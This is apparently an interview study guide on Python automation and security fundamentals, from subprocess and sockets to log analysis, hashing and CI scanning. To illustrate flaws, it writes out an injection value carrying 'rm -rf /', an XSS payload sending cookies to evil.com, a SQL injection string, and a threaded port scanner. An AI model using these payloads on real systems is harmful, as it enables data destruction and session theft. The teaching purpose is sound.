# Python Automation Engineering — Cyber & Technology

A study guide for automation developer interviews, covering system automation, network programming, log analysis, and security fundamentals.

---

## 1. subprocess — Running System Commands

`subprocess` is the central tool for automation work in Python. It lets a script run any shell command, capture its output, and react to the result programmatically. This is what turns Python from a general-purpose language into an automation orchestrator — it can drive `nmap`, `systemctl`, `git`, or any other command-line tool and process the results.

```python
import subprocess

result = subprocess.run(
    ["ping", "-c", "4", "8.8.8.8"],
    capture_output=True,  # capture stdout and stderr instead of printing them
    text=True,            # decode bytes to str automatically
    timeout=10            # abort if the command hangs
)
print(result.stdout)
print(result.returncode)  # 0 means success by Unix convention
```

The `timeout` parameter matters more than it looks in automation contexts. Without it, a single hung command — a network tool waiting on an unreachable host, for instance — will block the entire script indefinitely. In a script scanning a thousand servers overnight, that turns into a silent failure that nobody notices until morning.

For error handling there are two approaches. Checking `returncode` manually gives fine-grained control, while `check=True` raises an exception on any non-zero exit code, which is cleaner when any failure should abort the operation:

```python
try:
    result = subprocess.run(
        ["systemctl", "status", "nginx"],
        capture_output=True,
        text=True,
        check=True  # raises CalledProcessError if returncode != 0
    )
except subprocess.CalledProcessError as e:
    print(f"Command failed with code {e.returncode}: {e.stderr}")
except subprocess.TimeoutExpired:
    print("Command timed out")
```

### The shell=True security problem

This is a genuine security issue, not a style preference, and it comes up in cyber-focused interviews. When `shell=True` is used, the command string is passed to the system shell for interpretation — which means shell metacharacters in that string get interpreted as commands.

```python
# dangerous - shell injection vulnerability
user_input = "8.8.8.8; rm -rf /"
subprocess.run(f"ping {user_input}", shell=True)
# the shell sees two commands: "ping 8.8.8.8" and "rm -rf /"

# safe - arguments are passed directly to the process, no shell involved
subprocess.run(["ping", "-c", "4", user_input])
# the string "8.8.8.8; rm -rf /" is passed as a single literal argument to ping
```

When the argument list form is used, Python passes the arguments directly to the operating system's process-creation call. No shell ever parses the string, so semicolons, pipes, and backticks have no special meaning — they're just characters in an argument. The rule: never use `shell=True` with any input that came from a user, a file, a network request, or anywhere outside the program itself.

### run vs Popen

`subprocess.run()` is the high-level interface — it starts a process, waits for it to finish, and returns the result. `subprocess.Popen()` is the lower-level interface that gives a handle to a still-running process, which is what you need when you want to stream output as it's produced, run multiple processes concurrently, or interact with a process's stdin while it runs.

```python
# Popen - process runs in the background, output can be read as it appears
process = subprocess.Popen(
    ["tail", "-f", "/var/log/syslog"],
    stdout=subprocess.PIPE,
    text=True
)
for line in process.stdout:
    if "ERROR" in line:
        print(f"Alert: {line}")
```

---

## 2. pathlib and File System Automation

`pathlib` is the modern way to work with file paths in Python, replacing the older string-manipulation approach of `os.path`. Paths become objects with methods rather than strings that need to be joined and split carefully.

```python
from pathlib import Path

config_dir = Path("/etc/myapp")
config_file = config_dir / "settings.json"  # the / operator joins paths correctly on any OS

if config_file.exists():
    content = config_file.read_text()
```

For automation and security work, the most useful capability is recursive traversal with filtering:

```python
from pathlib import Path
import time

def find_recently_modified(directory: Path, hours: int = 24) -> list[Path]:
    cutoff = time.time() - (hours * 3600)
    return [
        f for f in directory.rglob("*")
        if f.is_file() and f.stat().st_mtime > cutoff
    ]
```

`rglob("*")` walks the directory tree recursively. This pattern — find files changed recently — is the basis of intrusion detection: unexpected modifications to system files or configuration directories are a common indicator of compromise.

Checking file permissions is another routine security automation task:

```python
def check_permissions(file_path: Path) -> str:
    mode = oct(file_path.stat().st_mode)[-3:]
    return mode  # e.g. "644" or "600"

def find_world_writable(directory: Path) -> list[Path]:
    # files writable by anyone are a common misconfiguration
    return [
        f for f in directory.rglob("*")
        if f.is_file() and int(oct(f.stat().st_mode)[-1]) & 0o2
    ]
```

---

## 3. socket — Low-Level Network Programming

The `socket` module gives direct access to TCP and UDP networking, which is what underlies every network tool. Understanding it is essential for both writing network automation and for reasoning about network security.

### Checking whether a port is open

```python
import socket

def check_port_open(host: str, port: int, timeout: float = 1.0) -> bool:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        result = sock.connect_ex((host, port))
        return result == 0
    finally:
        sock.close()
```

`AF_INET` specifies IPv4 and `SOCK_STREAM` specifies TCP (as opposed to `SOCK_DGRAM` for UDP). `connect_ex` is used rather than `connect` because it returns an error code instead of raising an exception, which is much more convenient when scanning many ports where most will be closed.

The `timeout` is critical: without it, a connection attempt to a filtered port (one silently dropped by a firewall rather than actively refused) will hang until the OS default timeout, which can be over a minute. Scanning a thousand ports with no timeout would take hours.

### A parallel port scanner

Port scanning is almost entirely I/O-bound — the CPU does nothing while waiting for network responses — which makes it the ideal case for threading despite the GIL:

```python
import socket
import concurrent.futures

def scan_port(host: str, port: int) -> tuple[int, bool]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    result = sock.connect_ex((host, port))
    sock.close()
    return port, result == 0

def scan_range(host: str, start_port: int, end_port: int) -> list[int]:
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [
            executor.submit(scan_port, host, port)
            for port in range(start_port, end_port + 1)
        ]
        for future in concurrent.futures.as_completed(futures):
            port, is_open = future.result()
            if is_open:
                open_ports.append(port)
    return sorted(open_ports)
```

With 100 worker threads, a thousand ports that would take roughly eight minutes sequentially (at 0.5s timeout each) complete in a few seconds. The GIL doesn't hurt here because each thread spends essentially all its time blocked on network I/O, during which the GIL is released.

### Ports worth knowing

```
20/21  FTP           - file transfer, unencrypted
22     SSH           - encrypted remote shell
23     Telnet        - unencrypted remote shell, should never be open
25     SMTP          - email sending
53     DNS           - name resolution
80     HTTP          - unencrypted web
443    HTTPS         - encrypted web
3306   MySQL         - database, should not be exposed publicly
3389   RDP           - Windows remote desktop, common attack target
```

---

## 4. Regular Expressions for Log Analysis

Log parsing is a large fraction of real security automation work, and regex is the primary tool for it. Logs arrive as unstructured text and need to become structured data that can be counted, correlated, and alerted on.

### Extracting structured data from a log line

```python
import re

log_line = '192.168.1.5 - - [10/Jun/2026:14:32:01] "POST /login HTTP/1.1" 401 512'

pattern = r'(?P<ip>\d+\.\d+\.\d+\.\d+) - - \[(?P<time>.*?)\] "(?P<request>.*?)" (?P<status>\d{3})'
match = re.match(pattern, log_line)

if match:
    data = match.groupdict()
    print(data["ip"], data["status"])
```

Named groups (`(?P<name>...)`) are worth using over positional groups because `groupdict()` returns a dictionary with meaningful keys, which is far more readable and less fragile than remembering that group 3 is the status code.

### Detecting a brute-force attack

This is the canonical log-analysis automation task: find IP addresses making an unusual number of failed login attempts.

```python
import re
from collections import defaultdict

def detect_brute_force(log_path: str, threshold: int = 5) -> dict[str, int]:
    pattern = r'(\d+\.\d+\.\d+\.\d+).*"POST /login.*" 401'
    attempts_by_ip = defaultdict(int)

    with open(log_path) as f:
        for line in f:
            match = re.search(pattern, line)
            if match:
                attempts_by_ip[match.group(1)] += 1

    return {ip: count for ip, count in attempts_by_ip.items() if count >= threshold}
```

The `401` status code specifically means authentication failed, which is what distinguishes a brute-force attempt from normal login traffic. Reading the file line by line rather than with `read()` matters for real log files, which are routinely gigabytes — line-by-line iteration keeps memory usage constant regardless of file size.

### A reusable log analyzer

```python
import re
from collections import Counter

class LogAnalyzer:
    def __init__(self, log_path: str):
        self._log_path = log_path
        self._entries = []

    def parse(self) -> None:
        pattern = (
            r'(?P<ip>\d+\.\d+\.\d+\.\d+) - - '
            r'\[(?P<time>.*?)\] "(?P<request>.*?)" (?P<status>\d{3})'
        )
        with open(self._log_path) as f:
            for line in f:
                match = re.match(pattern, line)
                if match:
                    self._entries.append(match.groupdict())

    def error_rate(self) -> float:
        if not self._entries:
            return 0.0
        errors = sum(1 for e in self._entries if e["status"].startswith(("4", "5")))
        return errors / len(self._entries)

    def top_requesting_ips(self, n: int = 10) -> list[tuple[str, int]]:
        return Counter(e["ip"] for e in self._entries).most_common(n)
```

A single IP accounting for a disproportionate share of traffic is a signal worth investigating — it could be a scraper, a scanner, or the start of a denial-of-service attempt.

---

## 5. File Integrity Monitoring

File integrity monitoring detects unauthorized changes to important files by recording a cryptographic hash of each file and periodically re-checking. Since any change to a file's contents produces a completely different hash, this reliably detects tampering even when an attacker preserves timestamps and file sizes.

```python
import hashlib
from pathlib import Path
import json

def compute_hash(file_path: Path) -> str:
    hasher = hashlib.sha256()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hasher.update(chunk)
    return hasher.hexdigest()
```

The chunked reading is what makes this work on large files. Reading a multi-gigabyte file into memory at once would exhaust available RAM; reading 4KB at a time and feeding each chunk to the hasher keeps memory usage constant. The `iter(callable, sentinel)` form calls the lambda repeatedly until it returns the sentinel value — here, an empty bytes object, which is what `read()` returns at end of file.

```python
def build_baseline(directory: Path) -> dict[str, str]:
    return {
        str(f): compute_hash(f)
        for f in directory.rglob("*")
        if f.is_file()
    }

def check_integrity(directory: Path, baseline: dict[str, str]) -> dict[str, list[str]]:
    current = build_baseline(directory)

    modified = [p for p in current if p in baseline and current[p] != baseline[p]]
    added = [p for p in current if p not in baseline]
    deleted = [p for p in baseline if p not in current]

    return {"modified": modified, "added": added, "deleted": deleted}
```

Detecting added and deleted files matters as much as detecting modifications — an attacker dropping a backdoor script or deleting log files to cover their tracks would otherwise go unnoticed.

SHA-256 is the appropriate choice here. MD5 and SHA-1 are cryptographically broken, meaning it's computationally feasible to construct a different file with the same hash — which would let an attacker replace a file with a malicious version that passes the integrity check.

---

## 6. Password Strength Checking

```python
import re

def check_password_strength(password: str) -> dict:
    checks = {
        "length": len(password) >= 12,
        "uppercase": bool(re.search(r'[A-Z]', password)),
        "lowercase": bool(re.search(r'[a-z]', password)),
        "digit": bool(re.search(r'\d', password)),
        "special": bool(re.search(r'[!@#$%^&*(),.?":{}|<>]', password)),
    }
    score = sum(checks.values())
    return {"checks": checks, "score": score, "strong": score >= 4}
```

Length is weighted most heavily in modern password guidance because it contributes far more to resistance against brute-force attacks than character variety does. A 16-character lowercase passphrase has substantially more entropy than an 8-character password with mixed character classes, despite looking less "complex."

---

## 7. Security Concepts

### The CIA Triad

The three properties that information security aims to protect:

**Confidentiality** — information is accessible only to those authorized to see it. Enforced through encryption, access controls, and authentication.

**Integrity** — information cannot be modified without detection. Enforced through hashing, digital signatures, and checksums. This is what file integrity monitoring protects.

**Availability** — the system is accessible when needed. Protected through redundancy, load balancing, and DDoS mitigation. Often overlooked, but an attack that takes a system offline is just as damaging as one that steals data.

These three frequently trade off against each other. Encrypting everything strengthens confidentiality but can reduce availability if key management fails. Aggressive rate limiting protects availability but may block legitimate users.

### SQL Injection

An attack where user input is interpreted as SQL code rather than as data:

```python
# vulnerable - user input becomes part of the query structure
query = f"SELECT * FROM users WHERE username = '{user_input}'"
# if user_input is: ' OR '1'='1
# the query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
# which returns every user in the table

# safe - parameterized query
cursor.execute("SELECT * FROM users WHERE username = ?", (user_input,))
```

The parameterized version works because the database receives the query structure and the data separately. The `?` placeholder tells the database "a value goes here" — the value is never parsed as SQL, so quotes and SQL keywords inside it have no special meaning.

### Cross-Site Scripting (XSS)

An attack where user input is rendered as HTML/JavaScript in another user's browser:

```
Vulnerable: rendering user_comment directly into a page
If user_comment is: <script>fetch('evil.com?c='+document.cookie)</script>
That script executes in the browser of everyone who views the page,
sending their session cookies to the attacker.
```

The defense is output encoding — converting `<` to `&lt;` and so on, so the browser renders the text as visible characters rather than interpreting it as markup.

### Buffer Overflow

Primarily a C/C++ concern, relevant because much security-critical infrastructure is written in those languages:

```cpp
// vulnerable - no bounds checking
char buffer[10];
strcpy(buffer, user_input); // writes past the end if user_input is longer than 10

// safer
char buffer[10];
strncpy(buffer, user_input, sizeof(buffer) - 1);
buffer[sizeof(buffer) - 1] = '\0';
```

Writing past the end of a buffer overwrites adjacent memory. In the classic exploit, that adjacent memory includes the function's return address on the stack — overwriting it lets an attacker redirect execution to code of their choosing. This class of vulnerability is why memory-safe languages are increasingly preferred for new security-sensitive code.

### Man-in-the-Middle (MITM)

An attacker positioned between two communicating parties, able to read and modify traffic. The defense is end-to-end encryption with certificate validation — TLS provides both, but only if certificate verification is actually performed. Code that disables certificate checking (a common shortcut in scripts) removes the protection entirely:

```python
# never do this outside a controlled test environment
httpx.get(url, verify=False)  # disables certificate validation, enabling MITM
```

### Symmetric vs Asymmetric Encryption

**Symmetric** encryption uses the same key to encrypt and decrypt (AES is the standard). It's fast and suitable for bulk data, but requires both parties to already share the key securely — which is itself a hard problem.

**Asymmetric** encryption uses a key pair: a public key that anyone can use to encrypt, and a private key that only the holder can use to decrypt (RSA, elliptic curve). This solves the key-distribution problem, but it's computationally expensive.

In practice both are used together: TLS uses asymmetric encryption during the handshake to securely agree on a symmetric session key, then uses that faster symmetric key for the actual data transfer.

### Vulnerability, Exploit, Payload

Precise terminology that interviewers sometimes probe:

- A **vulnerability** is the flaw itself — the unchecked buffer, the unsanitized input.
- An **exploit** is the technique or code that takes advantage of the vulnerability.
- The **payload** is what actually executes once the exploit succeeds — the reverse shell, the ransomware, the data exfiltration.

A **CVE** (Common Vulnerabilities and Exposures) is a public identifier for a specific known vulnerability, and **CVSS** is the scoring system rating its severity from 0 to 10. A **zero-day** is a vulnerability that's being exploited before the vendor knows about it or has released a patch — the "zero days" refers to how long defenders have had to prepare.

---

## 8. Networking Fundamentals

### The TCP/IP model

```
Application Layer  - HTTP, DNS, SSH, FTP - what the software speaks
Transport Layer    - TCP (reliable, ordered), UDP (fast, no guarantees)
Internet Layer     - IP - addressing and routing between networks
Link Layer         - Ethernet, WiFi - physical/local network delivery
```

### TCP vs UDP

TCP guarantees that data arrives complete and in order, retransmitting anything lost. This costs latency and overhead, but is required for anything where correctness matters — web pages, file transfers, database connections.

UDP sends packets with no guarantee of delivery or ordering, and no connection setup. This makes it faster and lower-latency, which is why it's used for video streaming, voice calls, DNS lookups, and online gaming, where a slightly stale packet is better than a delayed correct one.

### The TCP three-way handshake

```
Client                          Server
   |          SYN                  |
   |----------------------------->|   "I want to connect, my sequence number is X"
   |                               |
   |        SYN-ACK                |
   |<-----------------------------|   "Acknowledged, mine is Y"
   |                               |
   |          ACK                  |
   |----------------------------->|   "Acknowledged"
   |                               |
   |   connection established      |
```

This matters for security because it's the basis of the SYN flood attack: an attacker sends many SYN packets without ever completing the handshake, leaving the server holding half-open connections until its connection table fills and legitimate connections are refused.

---

## 9. Linux for Automation

### Service management with systemd

```bash
systemctl status sshd          # check a service's state
systemctl restart nginx        # restart a service
systemctl enable docker        # start automatically on boot
systemctl is-active --quiet nginx   # exit code 0 if running, useful in scripts

journalctl -u nginx --since "1 hour ago"   # logs for one service
journalctl -f                              # follow logs in real time
```

`systemctl is-active --quiet` is particularly useful in automation because it produces no output and communicates purely through its exit code, which is exactly what a shell conditional needs.

### Permissions

```bash
chmod 600 secret_file.txt   # owner read+write only
chmod 755 script.sh         # owner full, everyone else read+execute
chown user:group file       # change ownership
```

The three digits represent owner, group, and others, with each digit summing read (4), write (2), and execute (1). Understanding this is essential because overly permissive file permissions are one of the most common real-world misconfigurations — a world-readable file containing credentials, or a world-writable script that runs as root.

### Firewall rules

```bash
iptables -A INPUT -s 192.168.1.100 -j DROP        # block a specific IP
iptables -A INPUT -p tcp --dport 22 -j ACCEPT     # allow SSH
iptables -A INPUT -j DROP                          # default deny everything else
```

The ordering matters: `iptables` evaluates rules top to bottom and acts on the first match, so a default-deny rule must come last. The default-deny approach — explicitly allow what's needed, block everything else — is the correct security posture, as opposed to trying to enumerate everything that should be blocked.

---

## 10. Bash Scripting for Automation

Many automation tasks are simpler in Bash than in Python, particularly when they're mostly about running commands and checking results.

```bash
#!/bin/bash
# System health monitor, intended to run via cron

LOG_FILE="/var/log/health_check.log"
SERVICES=("nginx" "sshd" "docker")

for service in "${SERVICES[@]}"; do
    if systemctl is-active --quiet "$service"; then
        echo "$(date): $service is running" >> "$LOG_FILE"
    else
        echo "$(date): ALERT - $service is DOWN" >> "$LOG_FILE"
    fi
done

DISK_USAGE=$(df / | tail -1 | awk '{print $5}' | sed 's/%//')
if [ "$DISK_USAGE" -gt 90 ]; then
    echo "$(date): ALERT - disk usage at ${DISK_USAGE}%" >> "$LOG_FILE"
fi
```

Quoting variables (`"$service"` rather than `$service`) is not optional in Bash — an unquoted variable containing spaces gets split into multiple arguments, which is a classic source of subtle bugs and, when the variable contains untrusted data, a security issue.

### Scheduling with cron

```bash
crontab -e

*/5 * * * * /home/user/health_check.sh    # every 5 minutes
0 2 * * * /home/user/backup_script.sh     # daily at 02:00
0 0 * * 0 /home/user/weekly_scan.sh       # weekly, Sunday midnight
```

The five fields are minute, hour, day of month, month, and day of week. Cron jobs run with a minimal environment — a script that works when run manually may fail under cron because `PATH` and other variables differ, which is why absolute paths should always be used inside scheduled scripts.

---

## 11. CI/CD Security (DevSecOps)

Modern practice integrates security scanning directly into the build pipeline, so vulnerabilities are caught at commit time rather than in production.

```yaml
name: Security Scan
on: [push]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Static analysis for security issues
        run: |
          pip install bandit
          bandit -r ./src
      - name: Dependency vulnerability scan
        run: |
          pip install pip-audit
          pip-audit
```

`bandit` is a static analyzer that finds insecure patterns in Python source — hardcoded passwords, `shell=True` with variable input, use of weak hash functions. `pip-audit` checks installed dependencies against a database of known CVEs, which catches the very common case where the project's own code is fine but a library it depends on has a published vulnerability.

Automating a dependency check in Python:

```python
import subprocess
import json

def check_vulnerable_dependencies() -> list[dict]:
    result = subprocess.run(
        ["pip-audit", "--format", "json"],
        capture_output=True,
        text=True
    )
    return json.loads(result.stdout) if result.stdout else []
```

---

## 12. What SIEM Means

A SIEM (Security Information and Event Management) system aggregates logs from every part of an infrastructure — servers, firewalls, applications, endpoints — into one place, then correlates events across those sources to detect patterns no single source would reveal. A failed login on one server is noise; the same source IP failing logins across forty servers within a minute is an attack, and only a system with the full picture can see that.

Common platforms are Splunk, IBM QRadar, and the open-source ELK stack (Elasticsearch, Logstash, Kibana). The automation engineer's role around a SIEM usually involves writing the parsers that normalize logs from different sources into a common format, and writing the correlation rules that define what constitutes an alert.

The hardest practical problem with any automated detection system is false positives. A rule that's too sensitive generates so many alerts that analysts stop reading them — which is worse than no rule at all. Tuning thresholds, whitelisting known-good behavior, and requiring multiple weak signals to coincide before alerting are the standard mitigations.

---

## Quick Reference

```
subprocess           - run system commands, capture output; never shell=True with untrusted input
pathlib              - path objects with methods; rglob for recursive traversal
socket               - TCP/UDP; connect_ex for scanning; always set a timeout
re                   - log parsing; named groups for readability; line-by-line for big files
hashlib              - SHA-256 for integrity; chunked reading for large files
concurrent.futures   - ThreadPoolExecutor for I/O-bound parallelism (scanning, requests)
systemctl/journalctl - service state and logs; is-active --quiet for scripts
iptables             - firewall rules; order matters; default deny last
cron                 - scheduling; use absolute paths, minimal environment
bandit / pip-audit   - static analysis and dependency CVE scanning in CI
```

```
CIA triad           - Confidentiality, Integrity, Availability
SQL injection       - fix with parameterized queries, never string formatting
XSS                 - fix with output encoding
Buffer overflow     - C/C++ bounds checking; can overwrite return addresses
MITM                - fix with TLS and actual certificate validation
Symmetric crypto    - same key both ways, fast, key distribution problem (AES)
Asymmetric crypto   - key pair, slow, solves key distribution (RSA, ECC)
Vulnerability       - the flaw itself
Exploit             - the technique using the flaw
Payload             - what runs after the exploit succeeds
Zero-day            - exploited before a patch exists
```
